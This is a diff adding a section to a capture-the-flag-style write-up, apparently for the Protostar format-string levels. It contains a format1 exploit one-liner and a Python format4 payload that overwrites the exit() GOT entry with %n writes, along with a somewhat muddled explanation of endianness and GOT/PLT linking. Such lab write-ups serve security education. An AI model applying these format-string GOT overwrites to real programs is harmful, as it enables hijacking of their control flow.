@@ -557,3 +557,25 @@ So, ultimately the exploit is:
 ```python
 ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBB'+' %x '*125+' %n '"`"
 ```
+
+### Format Level 4 (./format4)
+
+Of before starting the format level 4 it is very important to understand the endian notation i.e the **little endian notation and the big endian notation**. Because here we are using the little endian ntotation and it is really confusing. So, here we are using a 32-bit system right? And so if you see the stack structure during debugging then you will see each registers containing 32 bits or 4 bytes. So, in each register, the stack address will increase by 4. Now if we take a look at inside the register then we will see that address increases from right to left. So if I draw two registers, their address would be : `....|4.3.2.1|....|8.7.6.5|....`. So, this is how addressing takes place in **little endian system**.
+So, in this level we are also introduced to the GOT and the PLT table i.e how dynamic linking takes place.
+When we are using a function which is dynamically linked then somehow the address of that function is stored in the GOT table and the address of that entry in the GOT table is stored in the PLT table and the address of the entry of the PLT table is then passed to the program which will execute that function.
+Now when that program will execute that function it will jump to the provided PLT address and then see the address present over there. Now it will go to the address present over there to the GOT table and there it will find the actual address of the function. So, we just change the address function present in the GOT table to our desired function. And that's it we have succesfully redirected our code with the help of GOT table.
+Here is the exploit code:
+
+```python
+import struct
+EXIT_GOT=0x8049724
+#HELLO_ADDR=0x80484b4
+exploit=""
+exploit+=struct.pack("I", EXIT_GOT)
+exploit+=struct.pack("I", EXIT_GOT+2)
+exploit+="%4$33964x"
+exploit+="%4$n"
+exploit+="%4$33616x"
+exploit+="%5$n"
+print exploit
+```
